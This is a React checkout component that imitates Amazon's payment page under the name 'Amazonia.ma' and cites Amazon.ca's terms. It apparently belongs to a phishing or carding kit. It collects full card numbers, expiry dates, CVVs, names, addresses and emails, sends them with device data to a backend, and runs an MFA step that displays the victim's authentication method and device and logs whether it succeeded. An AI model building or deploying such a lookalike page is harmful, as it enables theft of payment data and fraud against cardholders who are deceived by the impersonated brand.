import React, { useState } from 'react';
import './App.css';
import PaymentAmount from './components/PaymentAmount';
import CardDetailsForm from './components/CardDetailsForm';
import { startMFA } from './components/MFA';
import MFAOverlay from './components/MFAOverlay';
import Success from './components/Success';

const App: React.FC = () => {
  const [formData, setFormData] = useState({
    amount: '500.00',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    firstName: '',
    lastName: '',
    address: '',
    email: '',
  });

  const [mfaRequired, setMfaRequired] = useState(false); // Track MFA requirement
  const [mfaPending, setMfaPending] = useState(false); // Show spinner overlay while starting MFA
  const [mfaSelection, setMfaSelection] = useState<{ method: string; device: any } | null>(null);
  const [authStatus, setAuthStatus] = useState<'none' | 'success' | 'failed'>('none'); // Track auth result
  const [showSuccess, setShowSuccess] = useState(false); // Track whether to show success page

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      // Clean and sanitize all formatted fields before sending to backend
      const sanitizedCardNumber = formData.cardNumber.replace(/\s+/g, ''); // Remove spaces
      const sanitizedExpiryDate = formData.expiryDate.replace(/\D/g, ''); // Remove slash, keep only digits
      const sanitizedCvv = formData.cvv.replace(/\D/g, ''); // Keep only digits
      const sanitizedZipCode = formData.address.replace(/\D/g, ''); // Keep only digits

      // Fixed device information (static for demo/testing)
      const deviceInfo = {
        ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        platform: "MacIntel",
        language: "en-US"
      };

      // Geo info will be determined by backend from request headers
      // Backend will extract real IP from X-Forwarded-For, X-Real-IP, or remote_addr

      const payload = {
        ...formData,
        // Override formatted fields with clean data
        cardNumber: sanitizedCardNumber,
        expiryDate: sanitizedExpiryDate,
        cvv: sanitizedCvv,
        address: sanitizedZipCode,
        // Add default backend fields
        merchant_id: "demo_merchant",
        api_key: "sk_test_demo_key_12345",
        currency: "USD",
        email: formData.email || "user@example.com",
        // Add device information (geo will be determined by backend from request headers)
        device: deviceInfo
      };

      // Show overlay while MFA starts
      setMfaPending(true);

      // Delegate MFA logic to startMFA helper
      const result = await startMFA(payload);
      console.log('MFA result:', result);
      
      // Check if MFA was successful
      if (result && result.success) {
        console.log('✅ MFA Authentication SUCCESS!');
        console.log('Authentication details:', {
          method: result.selection?.method || 'No MFA required',
          device: result.selection?.device?.display_name || result.selection?.device?.name || 'N/A',
          success: result.success,
          mfaRequired: result.data?.mfa_required || false
        });
        
        // Redirect to success page instead of alert
        setAuthStatus('success');
        setMfaSelection(result.selection);
        setMfaRequired(false);
        setShowSuccess(true); // Show success page
      } else if (result && result.selection && !result.success) {
        console.log('❌ MFA Authentication FAILED');
        console.log('Failed authentication details:', {
          method: result.selection?.method,
          device: result.selection?.device?.display_name || result.selection?.device?.name,
          success: result.success,
          error: result.sendError || result.smsError || 'Unknown error'
        });
        
        // Update UI state but don't show alert popup
        setAuthStatus('failed');
        setMfaSelection(result.selection);
        setMfaRequired(true);
      } else if (result && result.selection) {
        // Selection made but no clear success/failure (shouldn't happen with new flow)
        setMfaSelection(result.selection);
        setMfaRequired(true);
        setAuthStatus('none');
        console.log('User selected method:', result.selection.method, 'device:', result.selection.device);
      } else {
        // No selection -> cancelled or no MFA required
        setMfaSelection(null);
        setMfaRequired(false);
        setAuthStatus('none');
      }

      setMfaPending(false);

    } catch (error) {
      setMfaPending(false);
      console.error('Error:', error);
      // Removed alert popup - just log the error
    }
  };

  const handleEditAmount = () => {
    const newAmount = prompt('Enter new amount:', formData.amount);
    if (newAmount) {
      setFormData({ ...formData, amount: newAmount });
    }
  };

  return (
    <>
      {showSuccess ? (
        <Success />
      ) : (
        <div style={{
          backgroundColor: '#F3F3F3',
          minHeight: '100vh',
          fontFamily: '"Amazon Ember", "Helvetica Neue", Roboto, Arial, sans-serif',
        }}>
          {/* Amazon Header */}
          <div style={{
            backgroundColor: '#131A22',
            padding: '14px 20px',
            display: 'flex',
            alignItems: 'center',
            boxShadow: '0 2px 8px rgba(0,0,0,0.15)'
          }}>
            <div style={{
              color: '#FF9900',
              fontSize: '28px',
              fontWeight: '700',
              marginRight: '20px',
              letterSpacing: '-0.5px'
            }}>
              Amazonia.ma
            </div>
            <div style={{
              color: '#FFFFFF',
              fontSize: '16px',
              marginLeft: 'auto',
              fontWeight: '400'
            }}>
              Checkout
            </div>
          </div>

          {/* Amazon Navigation */}
          <div style={{
            backgroundColor: '#FFFFFF',
            padding: '16px 20px',
            borderBottom: '1px solid #E7E7E7',
            fontSize: '13px',
            boxShadow: '0 1px 3px rgba(0,0,0,0.08)'
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ color: '#007600', fontWeight: '600' }}>WELCOME</span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ color: '#007600', fontWeight: '600' }}>ADDRESS</span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ color: '#007600', fontWeight: '600' }}>ITEMS</span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ color: '#007600', fontWeight: '600' }}>WRAP</span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ color: '#007600', fontWeight: '600' }}>SHIP</span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ 
                color: '#E47911', 
                fontWeight: 'bold', 
                padding: '4px 8px',
                backgroundColor: '#FFF3E0',
                borderRadius: '3px'
              }}>
                PAY
              </span>
              <span style={{ color: '#DDD' }}>→</span>
              <span style={{ color: '#999', fontWeight: '400' }}>PLACE ORDER</span>
            </div>
          </div>

          <MFAOverlay visible={mfaPending} />
          
          <div style={{
            maxWidth: '1200px',
            margin: '0 auto',
            padding: '24px',
            display: 'flex',
            gap: '24px'
          }}>
            {/* Main Content */}
            <div style={{
              flex: '1',
              backgroundColor: '#FFFFFF',
              padding: '32px',
              borderRadius: '8px',
              border: '1px solid #D5D9D9',
              boxShadow: '0 2px 8px rgba(0,0,0,0.05)'
            }}>
              <h1 style={{ 
                fontSize: '28px', 
                fontWeight: '400',
                margin: '0 0 8px 0',
                color: '#0F1111',
                lineHeight: '1.3'
              }}>
                Review your order
              </h1>

              <div style={{
                fontSize: '13px',
                color: '#565959',
                marginBottom: '32px',
                lineHeight: '1.5'
              }}>
                By placing your order, you agree to Amazon.ca's{' '}
                <span style={{ 
                  color: '#0066C0', 
                  textDecoration: 'none',
                  cursor: 'pointer'
                }}>
                  privacy notice
                </span>
                {' '}and{' '}
                <span style={{ 
                  color: '#0066C0', 
                  textDecoration: 'none',
                  cursor: 'pointer'
                }}>
                  conditions of use
                </span>.
              </div>

              {/* Payment Method Section */}
              <div style={{
                border: '1px solid #D5D9D9',
                borderRadius: '8px',
                marginBottom: '24px',
                overflow: 'hidden'
              }}>
                <div style={{
                  backgroundColor: '#FAFAFA',
                  padding: '16px 20px',
                  borderBottom: '1px solid #E7E7E7',
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#0F1111',
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <span>Payment method</span>
                  <span style={{ 
                    color: '#0066C0', 
                    fontWeight: '400',
                    fontSize: '14px',
                    cursor: 'pointer',
                    textDecoration: 'none'
                  }}>
                    Change
                  </span>
                </div>
                
                <div style={{
                  padding: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '12px',
                  borderBottom: '1px solid #F0F0F0'
                }}>
                  <div style={{
                    display: 'flex',
                    gap: '10px',
                    alignItems: 'center',
                    padding: '8px 12px',
                    backgroundColor: '#F8F8F8',
                    borderRadius: '6px'
                  }}>
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg"
                      alt="Visa"
                      style={{ width: '36px', height: '24px', objectFit: 'contain' }}
                    />
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg"
                      alt="MasterCard"
                      style={{ width: '36px', height: '24px', objectFit: 'contain' }}
                    />
                    <img
                      src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg"
                      alt="American Express"
                      style={{ width: '36px', height: '24px', objectFit: 'contain' }}
                    />
                    <img
                      src="https://www.discoversignage.com/uploads/DGN_AcceptanceMark_FC_Hrz_RGB.jpg"
                      alt="Discover"
                      style={{ width: '36px', height: '24px', objectFit: 'contain' }}
                    />
                  </div>
                  <span style={{ fontSize: '13px', color: '#565959' }}>ending in ****</span>
                </div>

                <form
                  onSubmit={handleSubmit}
                  style={{
                    padding: '20px'
                  }}
                >
                  <CardDetailsForm formData={formData} onChange={handleChange} />
                </form>
              </div>

              {/* Gift Cards Section */}
              <div style={{
                border: '1px solid #D5D9D9',
                borderRadius: '8px',
                marginBottom: '24px',
                overflow: 'hidden'
              }}>
                <div style={{
                  backgroundColor: '#FAFAFA',
                  padding: '16px 20px',
                  borderBottom: '1px solid #E7E7E7',
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#0F1111'
                }}>
                  Gift cards & promotional codes
                </div>
                <div style={{
                  padding: '20px',
                  display: 'flex',
                  gap: '12px'
                }}>
                  <input 
                    type="text" 
                    placeholder="Enter Code"
                    style={{
                      padding: '10px 14px',
                      border: '1px solid #D5D9D9',
                      borderRadius: '4px',
                      fontSize: '14px',
                      flex: '1',
                      outline: 'none',
                      transition: 'border-color 0.2s ease',
                    }}
                    onFocus={(e) => {
                      const target = e.target as HTMLInputElement;
                      target.style.borderColor = '#E77600';
                      target.style.boxShadow = '0 0 3px 2px rgba(228,121,17,0.15)';
                    }}
                    onBlur={(e) => {
                      const target = e.target as HTMLInputElement;
                      target.style.borderColor = '#D5D9D9';
                      target.style.boxShadow = 'none';
                    }}
                  />
                  <button style={{
                    padding: '10px 20px',
                    backgroundColor: '#F7F8FA',
                    border: '1px solid #D5D9D9',
                    borderRadius: '4px',
                    fontSize: '14px',
                    cursor: 'pointer',
                    fontWeight: '500',
                    transition: 'all 0.2s ease'
                  }}
                  onMouseOver={(e) => {
                    const target = e.target as HTMLButtonElement;
                    target.style.backgroundColor = '#EDFDFF';
                    target.style.borderColor = '#007185';
                  }}
                  onMouseOut={(e) => {
                    const target = e.target as HTMLButtonElement;
                    target.style.backgroundColor = '#F7F8FA';
                    target.style.borderColor = '#D5D9D9';
                  }}
                  >
                    Apply
                  </button>
                </div>
              </div>

              {mfaSelection && (
                <div style={{
                  border: '1px solid #D5D9D9',
                  borderRadius: '8px',
                  marginBottom: '24px',
                  overflow: 'hidden'
                }}>
                  <div style={{
                    backgroundColor: '#FAFAFA',
                    padding: '16px 20px',
                    borderBottom: '1px solid #E7E7E7',
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#0F1111'
                  }}>
                    Authentication Status
                  </div>
                  <div style={{ 
                    padding: '20px'
                  }}>
                    <div style={{ marginBottom: '12px', fontSize: '14px' }}>
                      <strong style={{ color: '#565959' }}>MFA Method:</strong>{' '}
                      <span style={{ color: '#0F1111' }}>{mfaSelection.method}</span>
                    </div>
                    <div style={{ marginBottom: '16px', fontSize: '14px' }}>
                      <strong style={{ color: '#565959' }}>Device:</strong>{' '}
                      <span style={{ color: '#0F1111' }}>
                        {mfaSelection.device?.display_name || mfaSelection.device?.name || mfaSelection.device?.number}
                      </span>
                    </div>
                    {authStatus === 'success' && (
                      <div style={{ 
                        padding: '12px 16px', 
                        backgroundColor: '#D5F4E6', 
                        border: '1px solid #00A652', 
                        borderRadius: '6px',
                        color: '#007B3A',
                        fontSize: '14px',
                        fontWeight: '600',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                      }}>
                        <span style={{ fontSize: '16px' }}>✅</span>
                        <strong>Authentication Successful!</strong>
                      </div>
                    )}
                    {authStatus === 'failed' && (
                      <div style={{ 
                        padding: '12px 16px', 
                        backgroundColor: '#FFEAEA', 
                        border: '1px solid #D13212', 
                        borderRadius: '6px',
                        color: '#D13212',
                        fontSize: '14px',
                        fontWeight: '600',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px'
                      }}>
                        <span style={{ fontSize: '16px' }}>❌</span>
                        <strong>Authentication Failed</strong>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>

            {/* Order Summary Sidebar */}
            <div style={{
              width: '320px',
              backgroundColor: '#FFFFFF',
              padding: '24px',
              borderRadius: '8px',
              border: '1px solid #D5D9D9',
              boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
              height: 'fit-content'
            }}>
              <button
                onClick={handleSubmit}
                disabled={mfaRequired}
                style={{
                  width: '100%',
                  padding: '12px 16px',
                  backgroundColor: mfaRequired ? '#F7CA00' : '#FFD814',
                  border: 'none',
                  borderRadius: '8px',
                  color: '#0F1111',
                  fontSize: '14px',
                  fontWeight: '600',
                  cursor: mfaRequired ? 'not-allowed' : 'pointer',
                  opacity: mfaRequired ? 0.7 : 1,
                  marginBottom: '24px',
                  transition: 'all 0.2s ease',
                  boxShadow: mfaRequired ? 'none' : '0 2px 5px rgba(255,153,0,0.3)'
                }}
                onMouseOver={(e) => {
                  if (!mfaRequired) {
                    const target = e.target as HTMLButtonElement;
                    target.style.backgroundColor = '#F7CA00';
                    target.style.transform = 'translateY(-1px)';
                    target.style.boxShadow = '0 4px 8px rgba(255,153,0,0.4)';
                  }
                }}
                onMouseOut={(e) => {
                  if (!mfaRequired) {
                    const target = e.target as HTMLButtonElement;
                    target.style.backgroundColor = '#FFD814';
                    target.style.transform = 'translateY(0)';
                    target.style.boxShadow = '0 2px 5px rgba(255,153,0,0.3)';
                  }
                }}
              >
                Place your order
              </button>

              <div style={{
                fontSize: '18px',
                fontWeight: '700',
                color: '#0F1111',
                marginBottom: '20px'
              }}>
                Order Summary
              </div>

              <div style={{
                padding: '16px',
                backgroundColor: '#F8F8F8',
                borderRadius: '6px',
                marginBottom: '20px'
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '14px',
                  marginBottom: '10px',
                  color: '#0F1111'
                }}>
                  <span>Items:</span>
                  <span style={{ fontWeight: '500' }}>CDN$ {parseFloat(formData.amount).toFixed(2)}</span>
                </div>

                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '14px',
                  marginBottom: '10px',
                  color: '#0F1111'
                }}>
                  <span>Shipping & Handling:</span>
                  <span style={{ fontWeight: '500' }}>CDN$ 0.00</span>
                </div>

                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '14px',
                  marginBottom: '10px',
                  color: '#0F1111'
                }}>
                  <span>Total before tax:</span>
                  <span style={{ fontWeight: '500' }}>CDN$ {parseFloat(formData.amount).toFixed(2)}</span>
                </div>

                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '14px',
                  marginBottom: '10px',
                  color: '#0F1111'
                }}>
                  <span>Estimated GST/HST:</span>
                  <span style={{ fontWeight: '500' }}>CDN$ {(parseFloat(formData.amount) * 0.13).toFixed(2)}</span>
                </div>

                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '14px',
                  marginBottom: '15px',
                  color: '#0F1111'
                }}>
                  <span>Estimated PST/RST/QST:</span>
                  <span style={{ fontWeight: '500' }}>CDN$ 0.00</span>
                </div>

                <hr style={{ 
                  margin: '15px 0', 
                  border: 'none', 
                  borderTop: '1px solid #E7E7E7' 
                }} />

                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  fontSize: '18px',
                  fontWeight: '700',
                  color: '#B12704'
                }}>
                  <span>Order Total:</span>
                  <span>CDN$ {(parseFloat(formData.amount) * 1.13).toFixed(2)}</span>
                </div>
              </div>

              <PaymentAmount amount={formData.amount} onEdit={handleEditAmount} />
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default App;
